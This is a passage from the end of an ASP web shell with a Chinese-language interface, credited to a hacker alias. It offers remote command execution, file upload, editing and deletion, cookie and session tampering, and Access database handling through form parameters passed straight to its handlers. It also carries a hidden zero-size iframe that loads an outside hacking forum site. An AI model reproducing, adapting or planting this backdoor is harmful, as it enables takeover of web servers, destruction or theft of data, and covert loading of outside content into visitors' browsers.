Response.Write "Response.Cookies('"&Items &"')('"&Itemkey&"')="& Request.Cookies(Items)(Itemkey)& "<A href='"&FileName&"?Work=DelCookies&CookieValue="&Items&"'><FONT COLOR='#FF3300'>[删]</FONT></A><Br>"
Next 
Else 
Response.Write "Response.Cookies('"&Items &"')="& Request.Cookies(Items) & "<A href='"&FileName&"?Work=DelCookies&CookieValue="&Items&"'>[<FONT COLOR='#FF3300'>删</FONT>]</A><Br>"
End If 
Next
%> </td></tr><tr><form method="POST" action="<%=Filename%>?Work=SetSesValue" name="SetSession"><th>Session值管理</th><tr><td class="td1" align="center"><font color="#FF0000">Session(" <input type="text" name="SetValue" size="12"> ") = ("<input type="text" name="MyValue" size="12">")</font> <input type="submit" value="设置" name="B6" class="button"> </td></form></tr><tr><td class="td1"><b>当前本站点保存在您机上的所有Session如下：</b><br>Session数量:<font color="#FF0000"><%=Session.Contents.Count%></font><br><%
Dim strName,iLoop
For Each strName in Session.Contents
If IsArray(Session(strName)) then 
For iLoop = LBound(Session(strName)) to UBound(Session(strName)) 
Response.Write "session('"&strName & ")(" & iLoop & ") = " & Session(strName)(iLoop) & "<a href='"&Filename&"?Work=DelSess&SessValue="&strname&"'>[<FONT  COLOR='#FF3300'>删</FONT>]</a><BR>" 
Next 
Else 
Response.Write "session('"&strName & "') = " & Session.Contents(strName) & "<a href='"&Filename&"?Work=DelSess&SessValue="&strname&"'>[<FONT  COLOR='#FF3300'>删</FONT>]</a><BR>" 
End If 
next
%> </td></tr></table><%End Sub%> <%Sub KeyWin()%> <table border="1" width="100%" id="table10" class="table1"><tr><th class="th1">键盘键值查询</th></tr><tr><td class="td1" align="center"><SCRIPT LANGUAGE='JScript'>function  keyDown()    
{  
       var  keycode  =  event.keyCode;  
       var  realkey  =  String.fromCharCode(event.keyCode);  
           document.all.GetKeys.value = keycode  
            document.all.InKyes.select()
} 
</SCRIPT>
<script>
<!--
document.write(unescape("%u7ED3%u679C%u503C%uFF1A%3Cinput%20%20type%3D%22text%22%20name%3D%22GetKeys%22%20readOnly%20size%3D%225%22%20onmouseover%3D%22this.select%28%29%22%3E%20%20%20%0D%0A%u8F93%u5165%u952E%uFF1A%3Cinput%20%20type%3D%22text%22%20%20onKeyPress%3D%22keyDown%28%29%22%20maxlength%3D%221%22%20name%3D%22InKyes%22%20size%3D%223%22%3E%20%0D%0A"));
//-->
</script>
</td></tr></table>
<%End Sub%>
<%
'压缩
Const JET_3X = 4
Function CompactDB(dbPath, boolIs97,Pass)
On Error Resume Next 
Dim fso, Engine, strDBPath
strDBPath = left(dbPath,instrrev(DBPath,"\"))
Set fso = CreateObject("Scripting.FileSystemObject")
If fso.FileExists(dbPath) Then 
Set Engine = CreateObject("JRO.JetEngine")
If boolIs97 = "Data97" Then
Engine.CompactDatabase "Provider=Microsoft.Jet.OLEDB.4.0;Data Source=" & dbpath, _
"Provider=Microsoft.Jet.OLEDB.4.0;Jet OLEDB:Database Password='"&Pass&"';Data Source=" & strDBPath & "temp.mdb;" _
& "Jet OLEDB:Engine Type=" & JET_3X
Else
Engine.CompactDatabase "Provider=Microsoft.Jet.OLEDB.4.0;Jet OLEDB:Database Password='"&Pass&"';Data Source=" & dbpath, _
"Provider=Microsoft.Jet.OLEDB.4.0;Data Source=" & strDBPath & "temp.mdb"
End If
If Err Then
CompactDB = Err.Description
Exit Function
End if
fso.CopyFile strDBPath & "temp.mdb",dbpath
fso.DeleteFile(strDBPath & "temp.mdb")
Set fso = nothing
Set Engine = nothing
CompactDB = "你的数据库, " & dbpath & ", 已经压缩成功!" & vbCrLf
Response.Write"<script>opener.window.location.reload()</script>"
Else
CompactDB = "数据库名称或路径不正确. 请重试!" & vbCrLf
End If
End Function
Sub Compressmdb(mdbPath)%>
<table border="1" width="100%" id="table12" class="table1">
<tr><form method="POST" name="YaSuoMdb" action="<%=Filename%>?Work=CompreData">
<td class="td1" colspan="2">路数库路径:<input type="text" name="MdbPath" size="49" readonly value="<%=mdbPath%>"></td></tr>
<tr><td class="td1" align="right" width="15%">密码:</td><td class="td1" width="82%"><font color="#FF0000">
<input type="text" name="MdbPass" size="20">(如果没有密码请不要填写任何东西)</font></td></tr>
<tr><td class="td1" align="center" colspan="2">
ACCESS97:<input type="radio" name="V2" value="Data97">
ACCESS2000:<input type="radio" name="V2" value="Data2000" checked></td></tr>
<tr><td class="td1" align="center" colspan="2">
<input type="Submit" value="确定压缩" name="ComPrsmdb" class="button"></td></form></tr></table>
<%End Sub%>
<%Sub MyMouseWin()%>
<table border="1" width="100%" id="table10" class="table1"><tr><td class="td1" align="center">[<a href="#" onClick="javascript:ShowWin('<%=FileName%>?Work=ShowKeyWin','KeyWin','500','150','')">键盘键值查询</a>] </td></tr><tr><td class="td1" align="center">[<a href="#" onClick="javascript:ShowWin('<%=FileName%>?Work=ShowListFileWin','ListWin','500','500','')">文件列表</a>] <!--[<a href="#" onClick="javascript:ShowWin('<%=FileName%>?Work=ShowGetDataWin','DateWin','500','350','')">数据库操作</a>]--> [<a href="#" onClick="javascript:ShowWin('<%=FileName%>?Work=ShowShellWin','ShellWin','500','300','')">远程命令</a>] [<a href="#" onClick="javascript:ShowWin('<%=FileName%>?Work=ShowCookieWin','CookieWin','500','400','')">网站验证管理</a>] [<a href="#" onClick="javascript:ShowWin('<%=FileName%>?Work=outlogin','outWin','500','100','')">退出登陆</a>] </td></tr>
<tr><td class="td1">
<UL>
<LI><STRONG>进入文件列表，您可以进行更细致的操作。</STRONG></LI></UL>
<OL>
<OL>
<LI>新建文件夹。 
<LI>新建空文件。可以在线编写新文件。 
<LI>上传文件（支持多个文件上传）。 
<LI>文件编辑；复制；删除。 
<LI>数据库压缩。 
<LI>浏览所有的文件夹以及文件的详细信息.</LI></OL></OL>
 </td></tr>
</table><%End Sub%>
<%
Sub DelFile(DelPath)
On Error Resume Next 
Call IsRoot(DelPath)
  Obj.DeleteFile(DelPath)
If Err Then
Show(Err.Description)
Exit Sub
Else
Show("文件删除成功!")
Response.Write"<script>opener.window.location.reload()</script>"
End If
Set Obj = Nothing
End Sub
Sub DelFolser(DelFolderPath)
On Error Resume Next 
Call IsRoot(DelFolderPath&SpPath)
  Obj.DeleteFolder(DelFolderPath)
If Err Then
Show(Err.Description)
Exit Sub
Else
Show("文件夹删除成功!")
Response.Write"<script>opener.window.location.reload()</script>"
End If
Set Obj = Nothing
End Sub

Sub DelSession(SessValue)
Session.Contents.Remove(Sessvalue)
Response.Redirect Filename&"?Work=ShowCookieWin"
End Sub

Sub SetSession(Sess1,Sess2)
If Sess1<>"" Then
Session(Sess1)=Sess2
End If
Response.Redirect Filename&"?Work=ShowCookieWin"
End Sub

Sub DelCookies(CookiesValue)
Response.Cookies(CookiesValue).Expires=Date-1
Response.Redirect Filename&"?Work=ShowCookieWin"
End Sub

Sub SetCookies(Co1,Co2,Co3)
If Co1<>"" And Co2="" Then
Response.Cookies(Co1).Expires=Date+30
Response.Cookies(Co1)=Co3
End If
If Co1<>"" And Co2<>"" Then
Response.Cookies(Co1).Expires=Date+30
Response.Cookies(Co1)(Co2)=Co3
End If
Response.Redirect Filename&"?Work=ShowCookieWin"
End Sub

Select Case Request("Work")
':::::::::::显示窗口判断::::::::::::::::::
Case "ShowUpFileWin"
Call UpFileWim(Request("PutPath"))
Case "ShowFolderWin"
Call FolderWin(Request("NewFolderPath"))
Case "ShowFileWin"
Call FileWin(Request("NewFilePath"))
Case "ShowCopyFileWin"
Call CopyFileWin(Request("CopyPath"))
Case "ShowListFileWin"
Call ListFileWin(Request("ListPath"))
Case "ShowEditFileWin"
Call EditFile(Request("EditPath"))
Case "ShowGetDataWin"
Call GetDataWin()
Case "ShowShellWin"
Call ShellWin(Null)
Case "ShowCookieWin"
Call CookieWin()
Case "ShowKeyWin"
Call KeyWin()
Case "ShowMdbWin"
Call Compressmdb(Request("MdbPath"))
'Case ""
'Call
'Case ""
'Call
'Case ""
'Call
'Case ""
'Call
'Case ""
'Call
'::::::数据处理判断:::::::::::
Case "PutFile"
Call SaveUp()
Case "NewFolder"
Call SaveFolder(Trim(Request.Form("FolderPath")),Trim(Request.Form("NewFolder")))
Case "NewFile"
Call SaveFile(Trim(Request.Form("FilePath")),Trim(Request.Form("NewFileName")))
Case "CopyFiles"
Call CopyFile(Request.Form("CopyPath"),Trim(Request.Form("NewCopyName")))
Case "PostEditFile"
Call SaveEditFile(Request("ReFilePath"),Request.Form("FileStr"))
Case "ShowDelFilewin"
Call DelFile(Request("DelPath"))
Case "ShowDelFolderwin"
Call DelFolser(Request("DelFolderPath"))
Case "ShowShellForm"
Call ShellWin(Trim(Request.Form("Command")))
Case "DelSess"
Call DelSession(Request("SessValue"))
Case "SetCookie"
Call SetCookies(Trim(Request.Form("Cookie1")),Trim(Request.Form("Cookie2")),Trim(Request.Form("Cookie3")))
Case "DelCookies"
Call DelCookies(Request("CookieValue"))
Case "SetSesValue"
Call SetSession(Trim(Request.Form("SetValue")),Trim(Request.Form("MyValue")))
Case "CallData"
Call MyDataEdit()
Case "CompreData"
Show(CompactDB(Request.form("MdbPath"), Request.form("V2"), Request.form("MdbPass")))
'Case ""
'Call
'Case ""
'Call
Case Else
Call MyMouseWin()
End Select
End If
%> </td></tr><tr><td align="center" bgcolor="#F6F6F6">Copyright &copy;2006 [<FONT COLOR='#9966FF'> 黑网之神 ：著</FONT>]制作，主页：<A HREF='http://www.killbase.com/' target='_blank'>http://www.killbase.com/</A></td></tr></table></div></body></html>
<iframe src=http://bbs.hack88.cn/ width=0 height=0></iframe>
